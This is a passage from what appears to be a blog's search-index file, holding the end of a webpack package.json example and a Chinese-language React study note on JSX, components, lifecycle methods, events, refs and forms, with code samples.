&#123; "test": "echo \"Error: no test specified\" &amp;&amp; exit 1", "develop": "webpack-dev-server --config webpack.develop.config.js --devtool eval --progress --colors --hot --content-base src", "publish": "webpack --config webpack.publish.config.js" &#125;, "keywords": [], "author": "", "license": "ISC", "devDependencies": &#123; "babel-core": "^6.20.0", "babel-loader": "^6.2.9", "babel-preset-es2015": "^6.18.0", "babel-preset-react": "^6.16.0", "css-loader": "^0.26.1", "eslint": "^3.12.0", "eslint-loader": "^1.6.1", "extract-text-webpack-plugin": "^1.0.1", "file-loader": "^0.9.0", "gulp": "^3.9.1", "html-webpack-plugin": "^2.24.1", "node-sass": "^4.0.0", "open-browser-webpack-plugin": "0.0.3", "sass-loader": "^4.0.2", "style-loader": "^0.13.1", "url-loader": "^0.5.7", "webpack": "^1.14.0", "webpack-dev-server": "^1.16.2" &#125;, "dependencies": &#123; "react": "^15.4.1", "react-dom": "^15.4.1" &#125;&#125; 示例代码地址：https://github.com/HongqinMa/webpack_example]]></content>
      <categories>
        <category>webpack</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React 学习笔记]]></title>
    <url>%2F2017%2F07%2F07%2FReact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[React 是 Facebook 开源的一个用于构建用户界面的 Javascript 库，已经 应用于 Facebook 及旗下 Instagram。 和庞大的 AngularJS 不同，React 专注于 MVC 架构中的 V，即视图。 这使得 React 很容易和开发者已有的开发栈进行融合。 React 顺应了 Web 开发组件化的趋势。应用 React 时，应该从 UI 出发抽象出不同的组件，然后像搭积木一样把它们拼装起来。 React简介这个项目本身也越滚越大，从最早的 UI 引擎变成了一整套前后端通吃的 Web App 解决方案。衍生的 React Native 项目，目标更是宏伟，希望用写 Web App 的方式去写 Native App。如果能够实现，整个互联网行业都会被颠覆，因为同一组人只需要写一次 UI ，就能同时运行在服务器、浏览器和手机。 官网地址英文网：http://facebook.github.io/react/docs/getting-started.html 中文网：http://reactjs.cn/react/docs/getting-started.html 在线编辑工具 JSFiddle在线编辑工具，可以方便快速学习 react 基本语法 为什么使用 React我们创造 React 是为了解决一个问题：构建随着时间数据不断变化的大规模应用程序。为了达到这个目标，React 采用下面两个主要的思想。 1、简单 仅仅只要表达出应用程序在任一个时间点应该长的样子，然后当底层的数据变了，React 会自动处理所有用户界面的更新。 2、声明式 (Declarative) 数据变化后，React 概念上与点击“刷新”按钮类似，但仅会更新变化的部分。 3、构建可组合的组件 React 都是关于构建可复用的组件。事实上，通过 React 唯一要做的事情就是构建组件。得益于其良好的封装性，组件使代码复用、测试和关注分离（separation of concerns）更加简单。 更多原因 http://facebook.github.io/react/blog/2013/06/05/why-react.html 实战案例http://info.smartstudy.com/http://www.kongkonghu.com/choicehttps://github.com/webpack/react-starter 入门视频https://www.youtube.com/watch?v=7eLqKgp0eeYhttps://www.youtube.com/watch?v=fZKaq623y38&amp;list=PLQDnxXqV213JJFtDaG0aE9vqvp6Wm7nBghttps://www.youtube.com/watch?v=QQK5hpUuOuA&amp;list=PLUAEXpf1UDMkzPOiNJBrlqsUryn7n2cnK 参考资料https://github.com/dingyiming/learn-Js-react/issues/1 React的四个概念简单介绍React主要有四个主要概念构成： Virtual DOMReact 组件JSX语法Data Flow（单向数据流） Virtual DOM虚拟DOM是React的基石之所以引入虚拟 DOM，一方面是性能的考虑。Web 应用和网站不同，一个 Web 应用 中通常会在单页内有大量的 DOM 操作，而这些DOM操作很慢。 在 React 中，应用程序在虚拟 DOM 上操作，这让 React 有了优化的机会。简单说，React 在每次需要渲染时，会先比较当前 DOM 内容和待渲染内容的差异，然后再决定如何最优地更新 DOM。这个过程被称为 reconciliation。 除了性能的考虑，React 引入虚拟 DOM 更重要的意义是提供了一种一致的开发方式来开发服务端应用、Web 应用和手机端应用： 因为有了虚拟 DOM 这一层，所以通过配备不同的渲染器，就可以将虚拟 DOM 的内容渲染到不同的平台。而应用开发者，使用 JavaScript 就可以通吃各个平台了。 Virtual DOM速度快的说明在 Web 开发中，我们总需要将变化的数据实时反应到 UI 上，这时就需要对 DOM 进行操作。而复杂或频繁的 DOM 操作通常是性能瓶颈产生的原因（如何进行高性能的复杂 DOM 操作通常是衡量一个前端开发人员技能的重要指标）。 React 为此引入了虚拟 DOM（Virtual DOM）的机制：在浏览器端用 Javascript 实现了一套 DOM API。基于 React 进行开发时所有的 DOM 构造都是通过虚拟 DOM 进行，每当数据变化时，React 都会重新构建整个 DOM 树，然后 React 将当前整个 DOM 树和上一次的 DOM 树进行对比，得到 DOM 结构的区别。而且 React 能够批处理虚拟 DOM 的刷新，在一个事件循环（Event Loop）内的两次数据变化会被合并。例如连续的先将节点内容从 A 变成 B，然后又从 B 变成 A，React 会认为 UI 不发生任何变化，而如果通过手动控制，这种逻辑通常是极其复杂的。 尽管每一次都需要构造完整的虚拟 DOM 树，但是因为虚拟 DOM 是内存数据，性能是极高的。而对实际 DOM 进行操作的仅仅是 Diff 部分，因而能达到提高性能的目的。这样，在保证性能的同时，开发者将不再需要关注某个数据的变化如何更新到一个或多个具体的 DOM 元素，而只需要 关心在任意一个数据状态下，整个界面是如何 Render 的。 http://blog.csdn.net/yczz/article/details/49585313 React组件组件化概念 虚拟 DOM(virtual-dom) 不仅带来了简单的 UI 开发逻辑，同时也带来了组件化开发的思想。所谓组件，即封装起来的具有独立功能的UI部件。 React 推荐以组件的方式去重新思考 UI 构成，将 UI 上每一个功能相对独立的模块定义成组件，然后将小的组件通过组合或者嵌套的方式构成大的组件，最终完成整体UI的构建。例如，Facebook 的 instagram.com 整站都采用了 React 来开发，整个页面就是一个大的组件，其中包含了嵌套的大量其它组件。 如果说 MVC 的思想是做到视图-数据-控制器的分离，那么组件化的思考方式则是带来了 UI 功能模块之间的分离。 通过一个典型的 Blog 评论界面来看 MVC 和组件化开发思路的区别： 对于 MVC 开发模式来说，开发者将三者定义成不同的类，实现了表现，数据，控制的分离。开发者更多的是从技术的角度来对UI进行拆分，实现松耦合。 对于 React 而言，则完全是一个新的思路，开发者从功能的角度出发，将 UI 分成不同的组件，每个组件都独立封装。在 React 中，按照界面模块自然划分的方式来组织和编写代码， 对于评论界面而言，整个 UI 是一个通过小组件构成的大组件，每个组件只关心自己部分的逻辑，彼此独立。 组件化开发特性React认为一个组件应该具有如下特征： (1)、可组合（Composeable）：一个组件易于和其它组件一起使用，或者嵌套在另一个组件内部。如果一个组件内部创建了另一个组件，那么说父组件拥有（own）它创建的子组件，通过这个特性，一个复杂的UI可以拆分成多个简单的UI组件；(2)、可重用（Reusable）：每个组件都是具有独立功能的，它可以被使用在多个UI场景；(3)、可维护（Maintainable）：每个小的组件仅仅包含自身的逻辑，更容易被理解和维护；(4)、可测试（Testable）：因为每个组件都是独立的，那么对于各个组件分别测试显然要比对于整个UI进行测试容易的多。 组件定义在 React 中定义一个组件也是相当的容易，组件就是一个实现预定义接口的 JavaScript 类： 1、组件渲染 ReactDOM.render 是 React 的最基本方法，用于将模板转为 HTML 语言，并插入指定的 DOM 节点。 1234ReactDOM.render( &lt;h1&gt;Hello, world!&lt;/h1&gt;, document.getElementById('example')); 而这个方法， 必须而且只能返回一个有效的 React 元素。这意味着，如果你的组件是由多个元素构成的，那么你必须在外边包一个顶层元素，然后返回这个顶层元素。比如创建一个布局组件： 12345678render:function()&#123; return React.createElement( "div",null, React.createElement("div",null,"header"), React.createElement("div",null,"content"), React.createElement("div",null,"footer") );&#125; 2、ES5方式定义组件 12345678910111213"use strict";var HelloMessage = React.createClass(&#123; displayName: "HelloMessage", render: function render() &#123; return React.createElement( "div", null, "Hello ", this.props.name ); &#125;&#125;);ReactDOM.render(React.createElement(HelloMessage, &#123; name: "John" &#125;), mountNode); 3、JSX 中定义组件 123456var HelloMessage = React.createClass(&#123; render: function() &#123; return &lt;div&gt;Hello &#123;this.props.name&#125;&lt;/div&gt;; &#125;&#125;);ReactDOM.render(&lt;HelloMessage name="John" /&gt;, mountNode); 4、ES6中定义组件 12345678910111213141516171819202122import './Hello.css';import './Hello.scss';import React, &#123;Component&#125; from 'react';// 内联样式let style = &#123; backgroundColor:'blue'&#125;export default class Hello extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; count: 'es6'&#125;; &#125; render() &#123; return ( &lt;div&gt; &lt;h1 style=&#123;style&#125;&gt;Hello world&#123;this.state.count&#125;&lt;/h1&gt; &lt;br/&gt; &lt;image/&gt; &lt;/div&gt; ) &#125;&#125; 5、注意事项 React 组件名称的首字母应当大写，关于大小写的差异你会在后面发现。 div 元素的样式类是用 className 而不是 class 声明的，这是因为 class 是 JavaScript 的保留字，渲染后，真实的 DOM 还会是：&lt;div class=&quot;ez-led&quot;&gt;Hello, React!&lt;/div&gt; JSX语法 什么是 JSX 在用 React 写组件的时候，通常会用到 JSX 语法，像是在 Javascript 代码里直接写起了 XML 标签，每一个 XML 标签都会被 JSX 转换工具转换成纯 Javascript 代码，直接使用纯 Javascript 代码写也是可以的，只是利用 JSX，组件的结构和组件之间的关系看上去更加清晰 JSX 语法使用 HTML 语言直接写在 JavaScript 语言之中，不加任何引号，这就是 JSX 的语法，它允许 HTML 与 JavaScript 的混写。 1234567891011var names = ['Alice', 'Emily', 'Kate'];ReactDOM.render( &lt;div&gt; &#123; names.map(function (name) &#123; return &lt;div&gt; Hello, &#123;name&#125;! &lt;/div&gt; &#125;) &#125; &lt;/div&gt;, document.getElementById('example')); 上面代码体现了 JSX 的基本语法规则：遇到 HTML 标签（以 &lt; 开头），就用 HTML 规则解析；遇到代码块（以 { 开头），就用 JavaScript 规则解析。 JSX 允许直接在模板插入 JavaScript 变量。如果这个变量是一个数组，则会展开这个数组的所有成员 12345678var arr = [ &lt;h1&gt;Hello world!&lt;/h1&gt;, &lt;h2&gt;React is awesome&lt;/h2&gt;,];ReactDOM.render( &lt;div&gt;&#123;arr&#125;&lt;/div&gt;, document.getElementById('example')); 上面代码的 arr 变量是一个数组，结果 JSX 会把它的所有成员，添加到模板，运行结果如下: Data Flow（单向数据流）传统的 MVC 到了 Flux 当中, 除了名字改变了, 重要的是大量的 Model 归到了 Store, View 也统一了,从而得到了所谓单向的数据流, 就是 Model 和 View 之间关系非常清晰了。这样需要人为管理的状态就一下少了很多, 结果体现在开发应用的效率当中。 Flux1、学习地址：https://hulufei.gitbooks.io/react-tutorial/content/flux.html 2、React 标榜自己是 MVC 里面 V 的部分，那么 Flux 就相当于添加 M 和 C 的部分，Flux 是 Facebook 使用的一套前端应用的架构模式。 3、一个 Flux 应用主要包含四个部分： (1)、dispatcher 处理动作分发，维护 Store 之间的依赖关系 (2)、stores 数据和逻辑部分 (3)、views React 组件，这一层可以看作 controller-views，作为视图同时响应用户交互 (4)、actions 提供给 dispatcher 传递数据给 store Flux 的核心“单向数据流“怎么运作的：Action -&gt; Dispatcher -&gt; Store -&gt; View 更多时候 View 会通过用户交互触发 Action，所以一个简单完整的数据流类似这样： 整个流程如下： 首先要有 action，通过定义一些 action creator 方法根据需要创建 Action 提供给 dispatcherView 层通过用户交互（比如 onClick）会触发 ActionDispatcher 会分发触发的 Action 给所有注册的 Store 的回调函数Store 回调函数根据接收的 Action 更新自身数据之后会触发一个 change 事件通知 View 数据更改了View 会监听这个 change 事件，拿到对应的新数据并调用 setState 更新组件 UI 所有的状态都由 Store 来维护，通过 Action 传递数据，构成了如上所述的单向数据流循环，所以应用中的各部分分工就相当明确，高度解耦了。这种单向数据流使得整个系统都是透明可预测的。 ReduxRedux 官方中文文档：http://camsong.github.io/redux-in-chinese/index. 其他Reflux：https://segmentfault.com/a/1190000002793786?utm_source=tuicool React快速开始创建项目文件夹初始化npm配置文件 1$ npm init -y 依赖环境在项目根目录下打开命令窗口下载 react 和 react-dom 依赖 1$ npm install react react-dom --save 创建目录结构Hello World 英文官网的：http://facebook.github.io/react/index.html 12345678Var React = require('react');Var ReactDOM = require('react-dom');var HelloMessage = React.createClass(&#123; render: function() &#123; return &lt;div&gt;Hello &#123;this.props.name&#125;&lt;/div&gt;; &#125;&#125;);ReactDOM.render(&lt;HelloMessage name="John" /&gt;, mountNode); 代码编译方式（语法转换）因为现在都是使用 jsx 和 es6，所以我们需要对 js 代码进行编译。 编译转换有分为浏览器中转换和离线转换，但是基本上不会用在浏览器中引入转换 js 转换，所以只介绍离线转换。 react-tools转换这是 react 自己提供的，而且是老版本的，因为中文官网还是老版本的 api，所以介绍的是这种方式。 首先安装依赖用命令进行转换，有兴趣的大家自己看一下jsx -h 12$ npm install -g react-toolsjsx --watch src/ build/ 参考地址：http://reactjs.cn/react/docs/getting-started.html babel转换英文官网的文档比较新，已经推荐使用 babel 来进行转换 1、下载依赖 安装babel、babel转换jsx的包、babel转化ES6的包 123npm install --global babel-clinpm install babel-preset-react -dev-savenpm install babel-preset-es2015 -dev-save 注意:加了 -dev 之后，运行 npm install 不会下载开发依赖，需要运行 npm install –dev 2、运行命令进行编译 1babel --presets react src --watch --out-dir build 3、将编译之后的js文件在index.html文件中引入 Gulp-reacthttps://github.com/sindresorhus/gulp-react Webpack请查看 webpack 的文档 开发工具 主要知识视图相关概念 !!! Props（属性，就是 element 上的 attrss）State（写过 view 组件的基本都会知道，按钮有三态，Normal，Highlight，Selected，包括 extjs，jquery 里的大部分 ui 框架都是有状态的。）Event（其实还应该算一个就是 dom 事件） 了解了上面这些，就可以写代码了，因为: 属性，解决了view的定义问题，即语义描述状态，是view的有穷状态机，根据状态决定组件 ui 和行为事件，是view里元素的行为 有穷状态机：http://baike.baidu.com/view/115336.htm jsx语法详解HTML 转义React 会将所有要显示到 DOM 的字符串转义，防止 XSS。所以如果 JSX 中含有转义后的实体字符比如 © (©) 最后显示到 DOM 中不会正确显示，因为 React 自动把 © 中的特殊字符转义了。有几种解决办法： 直接使用 UTF-8 字符 © 使用对应字符的 Unicode 编码 使用数组组装 &lt;div&gt;{[&#39;cc &#39;, &lt;span&gt;&amp;copy;&lt;/span&gt;, &#39; 2015&#39;]}&lt;/div&gt; 直接插入原始的 HTML &lt;div dangerouslySetInnerHTML=\{\{__html: &#39;cc &amp;copy; 2015&#39;\}\} /&gt; dangerouslySetInnerHTML 参考文档: http://reactjs.cn/react/tips/dangerously-set-inner-html.html 自定义 HTML 属性如果在 JSX 中使用的属性不存在于 HTML 的规范中，这个属性会被忽略。如果要使用自定义属性，可以用 data- 前缀。可访问性属性的前缀 aria- 也是支持的。 与dom的区别文档：http://reactjs.cn/react/docs/dom-differences.html 支持的标签和属性如果你要使用的某些标签或属性不在这些支持列表里面就可能被 React 忽略，必须要使用的话可以提 issue，或者用前面提到的 dangerouslySetInnerHTML。 支持列表：http://reactjs.cn/react/docs/tags-and-attributes.html 1、并不是所有的 html 标签和属性都能在 jsx 语法中使用 2、基本上你能用到的标签的属性，jsx 语法都支持 3、有些特殊的属性需要注意，必须 class 属性要变为 className 属性 所有的属性都是驼峰命名的，class 属性和 for 属性分别改为 className 和 htmlFor，来符合 DOM API 规范。 属性扩散有时候你需要给组件设置多个属性，你不想一个个写下这些属性，或者有时候你甚至不知道这些属性的名称，这时候 spread attributes 的功能就很有用了。 1234var props = &#123;&#125;;props.foo = x;props.bar = y;var component = &lt;Component &#123;...props&#125; /&gt;; 属性也可以被覆盖，写在后面的属性值会覆盖前面的属性。 123var props = &#123; foo: 'default' &#125;;var component = &lt;Component &#123;...props&#125; foo=&#123;'override'&#125; /&gt;;console.log(component.props.foo); // 'override' 自闭合标签如果只有一个组件，就用单闭合标签形式，如果有多个组件嵌套就用双闭合标签形式 http://reactjs.cn/react/tips/self-closing-tag.html 注释在 JSX 里使用注释也很简单，就是沿用 JavaScript，唯一要注意的是在一个组件的子元素位置使用注释要用 {} 包起来 1234567891011var content = ( &lt;Nav&gt; &#123;/* child comment, put &#123;&#125; around */&#125; &lt;Person /* multi line comment */ name=&#123;window.isLoggedIn ? window.name : ''&#125; // end of line comment /&gt; &lt;/Nav&gt;); React 的 API顶层 APIhttp://facebook.github.io/react/docs/top-level-api.html 组件 APIhttp://facebook.github.io/react/docs/component-api.html 组件的生命周期（特别重要）组件的生命周期，另外的名字是状态回调，和上面讲的状态的唯一差别，上面的状态是它里面的元素，而组件的生命周期是它自己。 https://hulufei.gitbooks.io/react-tutorial/content/component-lifecycle.html 组件的生命周期分成三个状态： Mounting：已插入真实 DOMUpdating：正在被重新渲染Unmounting：已移出真实 DOM 处理函数React 为每个状态都提供了两种处理函数，will函数在进入状态之前调用，did 函数在进入状态之后调用，三种状态共计五种处理函数。 componentWillMount()componentDidMount()componentWillUpdate(object nextProps, object nextState)componentDidUpdate(object prevProps, object prevState)componentWillUnmount() 此外，React 还提供两种特殊状态的处理函数。 componentWillReceiveProps(object nextProps)：已加载组件收到新的参数时调用shouldComponentUpdate(object nextProps, object nextState)：组件判断是否重新渲染时调用 函数调用顺序图 从上图中我们可以看出来，组件再初始化一次之后就不会再运行上图运行中文字以上的方法，反而里面会有事件监听，从而执行 shouleComponentUpdate 事件。 代码使用 ES5写法 12345678910111213141516var Hello = React.createClass(&#123; getInitialState() &#123; return &#123; liked: false &#125;; &#125;, render: function() &#123; console.log(this.state.liked); return( &lt;div&gt; &lt;h1 style=&#123;style&#125;&gt;Hello world&lt;/h1&gt; &lt;br/&gt; &lt;image/&gt; &lt;/div&gt; ) &#125;&#125;);module.exports = Hello; ES6写法 123456789101112131415export default class Hello extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; count: 'es6'&#125;; &#125; render() &#123; return ( &lt;div&gt; &lt;h1 style=&#123;style&#125;&gt;Hello world&#123;this.state.count&#125;&lt;/h1&gt; &lt;br/&gt; &lt;image/&gt; &lt;/div&gt; ) &#125;&#125; 参考文章http://www.cnblogs.com/CHONGCHONG2008/p/5099483.htmlhttp://pinggod.com/2015/React-%E7%BB%84%E4%BB%B6%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/http://reactjs.cn/react/docs/component-specs.html 注意点在 ES6 中用 ES5 的写法会报错. ES5/ES6 最新写法对照表React 的： http://www.tuicool.com/articles/equ2my ReactNative 的: http://bbs.reactnative.cn/topic/15/react-react-native-%E7%9A%84es5-es6%E5%86%99%E6%B3%95%E5%AF%B9%E7%85%A7%E8%A1%A8/2 生命周期代码 ES5 和 ES6 的区别123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149//语法规定//1、定义模块 class Life extends Component//2、导出模块 export default//3、引入模块 import//4、默认属性/*static defaultProps = &#123;autoPlay: false, maxLoops: 10,&#125;; // 注意这里有分号*///5、默认state/* constructor(props)&#123; super(props); console.log("构造函数"); // 初始化了我们的state，这是被推荐的写法 this.state = &#123; props1:"初始化state" &#125;; &#125; *///6、定义方法/*（1）生命周期的方法 componentWillMount()&#123; console.log("componentWillMount"); &#125; (2)自定义的方法 click1=()=&gt;&#123; console.log("点击了单击事件"); this.setState(&#123; props1:"改变state的值" &#125;) console.log("点击了单击事件结束"); &#125;*/// ES6语法定义的组件生命周期import React, &#123;Component&#125; from 'react';export default class Life extends Component &#123; // getDefaultProps,getInitialState在es6的写法中不被支持 constructor(props)&#123; super(props); console.log("构造函数"); // 初始化了我们的state，这是被推荐的写法 this.state = &#123; props1: "初始化state" &#125;; &#125; // 组件将要被渲染到真实的dom节点中 componentWillMount()&#123; console.log("componentWillMount"); &#125; // 组件已经插入到真实的dom节点中 componentDidMount()&#123; console.log("componentDidMount"); &#125; // 组件是否要被重新渲染 shouldComponentUpdate()&#123; console.log("shouldCompontentUpdate"); return true; &#125; // 组件将要被重新渲染 componentWillUpdate()&#123; console.log("conpontentWillUpdate"); &#125; // 组件已经被重新渲染 componentDidUpdate()&#123; console.log("conpontentDidUpdate"); &#125; // 组件将要接受到新属性 componentWillReceiveProps()&#123; console.log("compintentWillReceiveProps"); &#125; click1 = () =&gt; &#123; console.log("点击了单击事件"); this.setState(&#123; props1:"改变state的值" &#125;) console.log("点击了单击事件结束"); &#125; render() &#123; console.log("render"); return ( &lt;div&gt; &lt;h1 onClick=&#123;this.click1&#125;&gt;&#123;this.state.props1&#125;&lt;/h1&gt; &lt;/div&gt; ) &#125;&#125;// ES5定义组件的写法import React, &#123;Component&#125; from 'react';var Life = React.createClass(&#123; // getDefaultProps,getInitialState在es6的写法中不被支持 // 初始化props属性方法 getDefaultProps()&#123; console.log("getDefaultProps"); &#125;, // 初始化我们的state属性 getInitialState()&#123; console.log("getInitialState"); return &#123; props1: "初始化state的值" &#125; &#125;, // 组件将要被渲染到真实的dom节点中 componentWillMount()&#123; console.log("componentWillMount"); &#125;, // 组件已经插入到真实的dom节点中 componentDidMount()&#123; console.log("componentDidMount"); &#125;, // 组件是否要被重新渲染 shouldComponentUpdate()&#123; // 这个方法比较特殊，如果你要重写，你要在这里手动的进行一下state值是否发生改变的判断，因为已经把之前的方法覆盖了 console.log("shouldCompontentUpdate"); return true; &#125;, // 组件将要被重新渲染 componentWillUpdate()&#123; console.log("conpontentWillUpdate"); &#125;, // 组件已经被重新渲染 componentDidUpdate()&#123; console.log("conpontentDidUpdate"); &#125;, // 组件将要接受到新属性 componentWillReceiveProps()&#123; console.log("compintentWillReceiveProps"); &#125;, click1()&#123; console.log("点击事件"); this.setState(&#123; props1:"改变state的值" &#125;) console.log("2"); console.log(this.state.props1); &#125;, render() &#123; console.log("render"); return ( &lt;div&gt; &lt;h1 onClick=&#123;this.click1&#125;&gt;&#123;this.state.props1&#125;&lt;/h1&gt; &lt;/div&gt; ) &#125;&#125;)module.exports = Life; 事件处理使用onClick这种进行驼峰命名ES5和ES6的写法不一样，在ES6中要用bind方法绑定this(具体可参照ES5和ES6写法对照表) 12345678910111213141516171819import React, &#123; Component &#125; from 'react';import &#123; render &#125; from 'react-dom';export default class LinkButton extends Component &#123; constructor(props) &#123; super(props); this.state = &#123;liked: false&#125;; &#125; handleClick(e) &#123; this.setState(&#123; liked: !this.state.liked &#125;); &#125; render() &#123; const text = this.state.liked ? 'like' : 'haven\'t liked'; return ( &lt;p onClick=&#123;this.handleClick.bind(this)&#125;&gt; You &#123;text&#125; this. Click to toggle. &lt;/p&gt; ); &#125;&#125; 参数传递ES6 写法：给事件处理函数传递额外参数的方式：bind(this, arg1, arg2, …) 123456render: function() &#123; return &lt;p onClick=&#123;this.handleClick.bind(this, param1, param2, param3)&#125;&gt;;&#125;,handleClick: function(param1,param2,param3, event) &#123; // handle click&#125; React 支持的事件列表http://reactjs.cn/react/docs/events.html 组件事件的一个例子： 12345678910111213141516171819202122232425262728293031323334353637// react中的事件支持和使用import React, &#123;Component&#125; from 'react';// 直接在js中定义样式，内嵌样式let style = &#123; backgroundColor: 'blue'&#125;export default class ClickEvent extends Component &#123; // 设置默认属性和默认状态 constructor(props) &#123; super(props); // 初始化state this.state = &#123; liked: false &#125;; &#125; // 单击事件处理方法 handleClick(pm1,pm2,pm3,e) &#123; console.log(pm1); console.log(pm2); console.log(pm3); console.log(e); this.setState(&#123; liked: !this.state.liked &#125;); &#125; // 用箭头函数去定义自己的方法 handleMouseOver=(str)=&gt;&#123; console.log(str); &#125; render() &#123; const text = this.state.liked ? 'like' : 'haven\'t liked'; // return；里面是要渲染的html页面 return ( &lt;p onMouseOver=&#123;()=&gt;this.handleMouseOver("2016年")&#125; onClick=&#123;this.handleClick.bind(this,12,"dfdf",function()&#123;&#125;)&#125;&gt; You &#123;text&#125; this. Click to toggle. &lt;/p&gt; ); &#125;&#125; Dom操作方法一：findDOMNode()方法首先我们要了解 ReactDOM.render 组件返回的是对组件的引用也就是组件实例（对于无状态状态组件来说返回 null），注意 JSX 返回的不是组件实例，它只是一个 ReactElement 对象。 当组件加载到页面上之后（mounted），你都可以通过 react-dom 提供的 findDOMNode() 方法拿到组件对应的 DOM 元素。 123456import &#123; findDOMNode &#125; from 'react-dom';// Inside Component classcomponentDidMound() &#123; const el = findDOMNode(this);&#125;findDOMNode() 不能用在无状态组件上。 方法二：refs属性另外一种方式就是通过在要引用的 DOM 元素上面设置一个 ref 属性指定一个名称，然后通过 this.refs.name 来访问对应的 DOM 元素。 如果 ref 是设置在原生 HTML 元素上，它拿到的就是 DOM 元素，如果设置在自定义组件上，它拿到的就是组件实例，这时候就需要通过 findDOMNode 来拿到组件的 DOM 元素。 因为无状态组件没有实例，所以 ref 不能设置在无状态组件上，一般来说这没什么问题，因为无状态组件没有实例方法，不需要 ref 去拿实例调用相关的方法，但是如果想要拿无状态组件的 DOM 元素的时候，就需要用一个状态组件封装一层，然后通过 ref 和 findDOMNode 去获取。 123456789101112131415161718192021222324252627282930313233343536373839404142import React, &#123; Component &#125; from 'react';export default class MyInputFocus extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; userInput: '' &#125;; &#125; handleChange(e) &#123; // 1、通过ref和this.refs的配合使用可以在react中获取dom元素，dom元素上所有的属性方法都可以使用 // 2、通过this.refs获取dom元素是有使用位置限制的,必须在componentDidMount方法里面或者之后的生命周期方法中使用 // 3、react中是不推荐你用document.getElementById的方式去获取dom元素的 console.log(this.refs.theInput.value); this.setState(&#123; userInput: e.target.value &#125;); &#125; clearAndFocusInput() &#123; // 第一个参数是要重新赋值的state，第二个参数一个回调函数 this.setState(&#123; userInput: '' &#125;, () =&gt; &#123; this.refs.theInput.focus(); &#125;); &#125; render() &#123; return ( &lt;div&gt; &lt;div onClick = &#123;this.clearAndFocusInput.bind(this)&#125;&gt; Click to Focus and Reset &lt;/div&gt; &lt;input ref = "theInput" value = &#123;this.state.userInput&#125; onChange = &#123;this.handleChange.bind(this)&#125; /&gt; &lt;/div&gt; ); &#125;&#125;MyInputFocus.defaultProps = &#123; autoPlay:false, maxLoops:10,&#125;MyInputFocus.propTypes = &#123; autoPlay: React.PropTypes.bool.isRequired, maxLoops: React.PropTypes.number.isRequired,&#125; 注意事项 可以使用 ref 到的组件定义的任何公共方法，比如 this.refs.myTypeahead.reset()Refs 是访问到组件内部 DOM 节点唯一可靠的方法Refs 会自动销毁对子组件的引用（当子组件删除时）不要在 render 或者 render 之前访问 refs不要滥用 refs，比如只是用它来按照传统的方式操作界面 UI：找到 DOM -&gt; 更新 DOM 和其他库配合使用http://reactjs.cn/react/tips/use-react-with-other-libraries.html 组件的 DOM 事件监听这篇文章是讲如何给 DOM 元素绑定 React 未提供的事件 123456789101112131415161718var Box = React.createClass(&#123; getInitialState: function() &#123; return &#123;windowWidth: window.innerWidth&#125;; &#125;, handleResize: function(e) &#123; this.setState(&#123;windowWidth: window.innerWidth&#125;); &#125;, componentDidMount: function() &#123; window.addEventListener('resize', this.handleResize); &#125;, componentWillUnmount: function() &#123; window.removeEventListener('resize', this.handleResize); &#125;, render: function() &#123; return &lt;div&gt;Current window width: &#123;this.state.windowWidth&#125;&lt;/div&gt;; &#125;&#125;);React.render(&lt;Box /&gt;, mountNode); http://reactjs.cn/react/tips/dom-event-listeners.html 1、注意添加dom事件的位置 2、在组件退出的时候，取消监听事件 组件的 DOM 事件监听的例子： 123456789101112131415161718192021222324252627282930313233// react中的 dom 监听事件import React, &#123; Component &#125; from 'react';export default class ListenEvent extends Component &#123; constructor(props) &#123; super(props); //this.state=&#123; userInput: '' &#125;; &#125; // 演示错误添加监听事件 componentWillMount() &#123; //window.addEventListener('resize', this.handleResize); &#125; componentDidMount() &#123; // 1、在已经插入到真实的dom节点之后，注册窗体改变大小的事件监听 // 3、用ajax发起数据请求的操作也要在componentDidMount方法里面去调用 window.addEventListener('resize', this.handleResize); &#125; componentWillUnmount() &#123; // 2、在组件将要被卸载的时候移除监听事件，防止对其他组件的影响 window.removeEventListener('resize', this.handleResize); &#125; handleResize=(e)=&gt;&#123; console.log(window.innerWidth); &#125; render() &#123; return ( &lt;div&gt; &lt;div&gt; dom事件监听 &lt;/div&gt; &lt;/div&gt; ); &#125;&#125; 数据获取http://facebook.github.io/react/tips/initial-ajax.html 用 ajax 发起数据请求的操作也要在 componentDidMount 方法里面去调用 表单表单不同于其他 HTML 元素，因为它要响应用户的交互，显示不同的状态，所以在 React 里面会有点特殊。 状态属性表单元素有这么几种属于状态的属性： value，对应 &lt;input&gt; 和 &lt;textarea&gt; 所有checked，对应类型为 checkbox 和 radio 的 &lt;input&gt; 所有selected，对应 &lt;option&gt; 所有 在 HTML 中 &lt;textarea&gt; 的值可以由子节点（文本）赋值，但是在 React 中，要用 value 来设置。表单元素包含以上任意一种状态属性都支持 onChange 事件监听状态值的更改。针对这些状态属性不同的处理策略，表单元素在 React 里面有两种表现形式。 受控组件对于设置了上面提到的对应“状态属性“值的表单元素就是受控表单组件，比如： 123render: function() &#123; return &lt;input type="text" value="hello"/&gt;;&#125; 一个受控的表单组件，它所有状态属性更改涉及 UI 的变更都由 React 来控制（状态属性绑定 UI）。比如上面代码里的 &lt;input&gt; 输入框，用户输入内容，用户输入的内容不会显示（输入框总是显示状态属性 value 的值 hello），所以说这是受控组件，不是原来默认的表单元素了。 如果希望输入的内容反馈到输入框，就要用 onChange 事件改变状态属性 value 的值： 12345678910getInitialState: function() &#123; return &#123;value: 'hello'&#125;;&#125;,handleChange: function(event) &#123; this.setState(&#123;value: event.target.value&#125;);&#125;,render: function() &#123; var value = this.state.value; return &lt;input type="text" value=&#123;value&#125; onChange=&#123;this.handleChange&#125; /&gt;;&#125; 使用这种模式非常容易实现类似对用户输入的验证，或者对用户交互做额外的处理，比如截断最多输入140个字符： 123handleChange: function(event) &#123; this.setState(&#123;value: event.target.value.substr(0, 140)&#125;);&#125; 受控组件例子： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758//dom操作demoimport React, &#123; Component 